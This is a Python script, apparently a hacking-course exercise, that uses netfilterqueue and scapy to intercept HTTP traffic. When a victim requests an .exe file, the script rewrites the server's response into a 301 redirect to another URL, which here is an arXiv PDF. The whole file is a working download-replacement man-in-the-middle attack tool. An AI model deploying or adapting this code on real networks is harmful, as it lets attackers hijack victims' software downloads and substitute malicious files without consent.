#!/usr/bin/env python

import netfilterqueue
from scapy.packet import Raw
from scapy.layers.inet import IP, TCP

ack_list = []
redirect = b"HTTP/1.1 301 Moved Permanently\nLocation: https://arxiv.org/pdf/2105.14943.pdf\n\n" 

def set_load(packet, load):
    print(packet.show())
    packet[Raw].load = load

    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum

    return packet

def process_packet(packet):
    
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
        if scapy_packet[TCP].dport == 80:
            # print("HTTP Request")
            if ".exe".encode() in scapy_packet[Raw].load:
                print("[+] exe request detected.") 
                ack_list.append(scapy_packet[TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[TCP].sport == 80:
            # print("HTTP Response")
            if scapy_packet[TCP].seq in ack_list:
                ack_list.remove(scapy_packet[TCP].seq)
                print("[+] Modifying download file")
                mod_packet = set_load(scapy_packet, redirect)

                print(scapy_packet.show())
                packet.set_payload(bytes(mod_packet))

    # print(packet.get_payload())
    packet.accept()

def main():
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

if __name__ == "__main__":
    main()
